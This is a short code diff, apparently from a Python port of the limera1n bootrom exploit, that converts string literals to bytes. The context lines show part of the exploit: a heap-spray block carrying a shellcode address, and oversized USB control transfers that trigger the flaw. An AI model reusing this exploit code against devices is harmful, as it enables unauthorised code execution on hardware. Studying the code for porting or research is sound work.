@@ -195,7 +195,7 @@ def generate_payload(constants, exploit_lr):
 
     shellcode_address = 0x84000400 + 1
     heap_block = struct.pack(
-        "<4I48s", 0x405, 0x101, shellcode_address, exploit_lr, "\xCC" * 48
+        "<4I48s", 0x405, 0x101, shellcode_address, exploit_lr, b"\xCC" * 48
     )
     return (
         heap_block * 16
@@ -240,7 +240,7 @@ def exploit():
 
     assert len(device.ctrl_transfer(0xA1, 1, 0, 0, 1, 1000)) == 1
 
-    limera1n_libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, "A" * 0x800, 10)
+    limera1n_libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, b"A" * 0x800, 10)
 
     try:
         device.ctrl_transfer(0x21, 2, 0, 0, 0, 10)
